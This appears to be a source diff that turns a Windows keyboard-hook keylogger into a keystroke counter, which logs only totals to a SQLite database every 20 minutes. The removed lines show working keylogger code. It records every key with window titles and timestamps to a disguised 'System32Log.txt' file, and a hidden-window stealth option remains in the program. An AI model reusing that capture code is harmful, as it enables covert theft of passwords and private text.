@@ -3,7 +3,13 @@
 #include <iostream>
 #include <cstdio>
 #include <fstream>
+#include <time.h>
 
+#include "sqlite3.h"
+
+const char DATABASE_FILE[] = "keystrokes.sqlite";
+
+using namespace std;
 // defines whether the window is visible or not
 // should be solved with makefile, not in this file
 #define visible // (visible / invisible)
@@ -16,10 +22,12 @@ HHOOK _hook;
 // it contains the thing you will need: vkCode = virtual key code.
 KBDLLHOOKSTRUCT kbdStruct;
 
-int Save(int key_stroke);
-std::ofstream OUTPUT_FILE;
+int incStrokeCount(int key_stroke);
+int keystrokeCount = 0;
 
-extern char lastwindow[256];
+bool keep_running = true;
+
+const int R_INTERVAL = 20;
 
 // This is the callback function. Consider it the event that is raised when, in this case, 
 // a key is pressed.
@@ -34,7 +42,7 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
 			
 			// save to file
-			Save(kbdStruct.vkCode);
+			incStrokeCount(kbdStruct.vkCode);
 		}
 	}
 
@@ -59,95 +67,40 @@ void ReleaseHook()
 	UnhookWindowsHookEx(_hook);
 }
 
-int Save(int key_stroke)
+int incStrokeCount(int key_stroke)
 {
-    char lastwindow[256];
+    if ((key_stroke == 1) || (key_stroke == 2))
+        return 0;
     
-	if ((key_stroke == 1) || (key_stroke == 2))
-		return 0; // ignore mouse clicks
-	
-	HWND foreground = GetForegroundWindow();
-    DWORD threadID;
-    HKL layout;
-    if (foreground) {
-        //get keyboard layout of the thread
-        threadID = GetWindowThreadProcessId(foreground, NULL);
-        layout = GetKeyboardLayout(threadID);
+    if (key_stroke == VK_BACK ||
+        key_stroke == VK_RETURN ||
+        key_stroke == VK_SPACE ||
+        key_stroke == VK_TAB ||
+        key_stroke == VK_SHIFT ||
+        key_stroke == VK_LSHIFT ||
+        key_stroke == VK_RSHIFT ||
+        key_stroke == VK_CONTROL ||
+        key_stroke == VK_LCONTROL ||
+        key_stroke == VK_RCONTROL ||
+        key_stroke == VK_ESCAPE ||
+        key_stroke == VK_END ||
+        key_stroke == VK_HOME ||
+        key_stroke == VK_LEFT ||
+        key_stroke == VK_UP ||
+        key_stroke == VK_RIGHT ||
+        key_stroke == VK_DOWN ||
+        key_stroke == 190 ||
+        key_stroke == 110 ||
+        key_stroke == 189 ||
+        key_stroke == 109 || 
+        key_stroke == 20 ) {
+        // Ignore
     }
-
-    if (foreground)
-    {
-        char window_title[256];
-        GetWindowText(foreground, window_title, 256);
-        
-        if(strcmp(window_title, lastwindow)!=0) {
-            strcpy(lastwindow, window_title);
-            
-            // get time
-            time_t t = time(NULL);
-            struct tm *tm = localtime(&t);
-            char s[64];
-            strftime(s, sizeof(s), "%c", tm);
-            
-            OUTPUT_FILE << "\n\n[Window: "<< window_title << " - at " << s << "] ";
-        }
+    else {
+        //if ( keystrokeCount % 10 == 0) printf("keystroke detected\n");
+        keystrokeCount++;
     }
-
-
-	std::cout << key_stroke << '\n';
-
-	if (key_stroke == VK_BACK)
-        OUTPUT_FILE << "[BACKSPACE]";
-	else if (key_stroke == VK_RETURN)
-		OUTPUT_FILE <<  "\n";
-	else if (key_stroke == VK_SPACE)
-		OUTPUT_FILE << " ";
-	else if (key_stroke == VK_TAB)
-		OUTPUT_FILE << "[TAB]";
-	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
-		OUTPUT_FILE << "[SHIFT]";
-	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
-		OUTPUT_FILE << "[CONTROL]";
-	else if (key_stroke == VK_ESCAPE)
-		OUTPUT_FILE << "[ESCAPE]";
-	else if (key_stroke == VK_END)
-		OUTPUT_FILE << "[END]";
-	else if (key_stroke == VK_HOME)
-		OUTPUT_FILE << "[HOME]";
-	else if (key_stroke == VK_LEFT)
-		OUTPUT_FILE << "[LEFT]";
-	else if (key_stroke == VK_UP)
-		OUTPUT_FILE << "[UP]";
-	else if (key_stroke == VK_RIGHT)
-		OUTPUT_FILE << "[RIGHT]";
-	else if (key_stroke == VK_DOWN)
-		OUTPUT_FILE << "[DOWN]";
-	else if (key_stroke == 190 || key_stroke == 110)
-		OUTPUT_FILE << ".";
-	else if (key_stroke == 189 || key_stroke == 109)
-		OUTPUT_FILE << "-";
-	else if (key_stroke == 20)
-		OUTPUT_FILE << "[CAPSLOCK]";
-	else {
-        char key;
-        // check caps lock
-        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
-
-        // check shift key
-        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
-            lowercase = !lowercase;   
-        }
-
-        //map virtual key according to keyboard layout 
-        key = MapVirtualKeyExA(key_stroke,MAPVK_VK_TO_CHAR, layout);
-        
-        //tolower converts it to lowercase properly
-        if (!lowercase) key = tolower(key);
-		OUTPUT_FILE <<  char(key);
-    }
-	//instead of opening and closing file handlers every time, keep file open and flush.
-    OUTPUT_FILE.flush();
-	return 0;
+    return 0;
 }
 
 void Stealth()
@@ -161,10 +114,130 @@ void Stealth()
 	#endif // invisible
 }
 
+void FileTimeToTimeT(time_t& t, FILETIME ft) {
+    ULARGE_INTEGER time_value;
+
+    time_value.LowPart  = ft.dwLowDateTime;
+    time_value.HighPart = ft.dwHighDateTime;
+
+    t = (time_value.QuadPart - 116444736000000000LL) / 10000000LL;
+}
+
+time_t GetTimeStamp() {
+  SYSTEMTIME lt;
+  ULARGE_INTEGER timestamp64bit;
+  GetLocalTime(&lt);
+  FILETIME ft;
+  SystemTimeToFileTime(&lt, &ft);
+  time_t t;
+  FileTimeToTimeT(t, ft);
+  return t;
+}
+
+void TimeToString(char* str, time_t t) {
+  struct tm *tm = gmtime(&t);
+  strftime(str, 20, "%d/%m/%y - %H:%M", tm);
+}
+
+int create_db() {
+    sqlite3* db;
+    char *errMsg = 0;
+
+    // Open the database connection
+    int rc = sqlite3_open(DATABASE_FILE, &db);
+    if (rc != SQLITE_OK) {
+        std::cerr << "Can't open database: " << sqlite3_errmsg(db) << std::endl;
+        return 1;
+    } 
+
+    // Execute SQL statement
+    const char *query = "CREATE TABLE IF NOT EXISTS KEYLOG("
+                        "TIMESTAMP     INT PRIMARY_KEY     NOT NULL,"
+                        "COUNT         INT                 NOT NULL);";
+
+    rc = sqlite3_exec(db, query, 0, 0, &errMsg);
+    if (rc != SQLITE_OK) {
+        std::cerr << "SQL error: " << errMsg << std::endl;
+        sqlite3_free(errMsg);
+    } else {
+        std::cout << "Table create query succeeded" << std::endl;
+    }
+
+    sqlite3_close(db);
+    return 0;
+}
+
+int insert_row(time_t timestamp, int keystroke_count) {
+    sqlite3* db;
+    char *errMsg = 0;
+
+    // Open the database connection
+    int rc = sqlite3_open(DATABASE_FILE, &db);
+    if (rc) {
+        std::cerr << "Can't open database: " << sqlite3_errmsg(db) << std::endl;
+        return 1;
+    }
+
+    const char *query = "INSERT INTO KEYLOG (TIMESTAMP, COUNT) "
+                        "VALUES (%ld, %d);";
+
+    char query_expanded[256];
+
+    sprintf(query_expanded, query, timestamp, keystroke_count);
+    //printf("insert query: %s\n", query_expanded);
+
+    rc = sqlite3_exec(db, query_expanded, 0, 0, &errMsg);
+    if (rc != SQLITE_OK) {
+        std::cerr << "SQL error: " << errMsg << std::endl;
+        sqlite3_free(errMsg);
+    } else {
+        //std::cout << "Row inserted successfully" << std::endl;
+    }
+
+    // Close the database connection
+    sqlite3_close(db);
+
+    return 0;
+}
+
+// This thread will report and update database periodically
+DWORD WINAPI reporter(LPVOID lpParam) {
+    int threadId = *(reinterpret_cast<int*>(lpParam));
+    time_t last, delay;
+
+    last = 0;
+    delay = 60 * R_INTERVAL; // R_INTERVAL minutes delay
+
+    while (keep_running) {
+        time_t current = GetTimeStamp();
+        if ((current - last) >= delay) {
+            char str[256]; 
+            TimeToString(str, current);
+            printf("%s - %d\n", str, keystrokeCount);
+            insert_row(current, keystrokeCount);
+            last = current;
+            time_t mins = (last / 60) % 60;
+            delay = 60 * (R_INTERVAL - (mins % R_INTERVAL));
+            std::cout.flush();
+            //printf("Sleeping for %d seconds\n", delay);
+            Sleep(delay * 1000);
+        } else {
+            // Check back in a second
+            Sleep(1000);
+        }
+    }
+    //printf("Reporter thread quitting\n");
+    return 0;
+}
+
 int main()
 {
-	//open output file in append mode
-    OUTPUT_FILE.open("System32Log.txt",std::ios_base::app);	
+
+  HANDLE thread;
+  DWORD tid;
+  int rank = 0;
+  create_db();
+  thread = CreateThread(NULL, 0, reporter, &rank, 0, &tid);
 
 	// visibility of window
 	Stealth();
@@ -173,8 +246,26 @@ int main()
 	SetHook();
 
 	// loop to keep the console application running.
-	MSG msg;
-	while (GetMessage(&msg, NULL, 0, 0))
-	{
-	}
+  /*std::string line;
+	while (keep_running) {
+      std::getline(std::cin, line);
+
+      if (line == "done") {
+          printf("Marking the end of the program\n");
+          ReleaseHook();
+          keep_running = false;
+      } else if (line == "show") {
+          printf("Current keystroke count: %d\n", keystrokeCount);
+      } else {
+      }
+	}*/
+  MSG msg;
+
+  while(GetMessage(&msg, NULL, 0, 0)) {
+    //std::cout << "Message: " << msg.message << std::endl;
+  }
+
+  WaitForMultipleObjects(1, &thread, TRUE, INFINITE);
+  CloseHandle(thread);
+  return 0;
 }
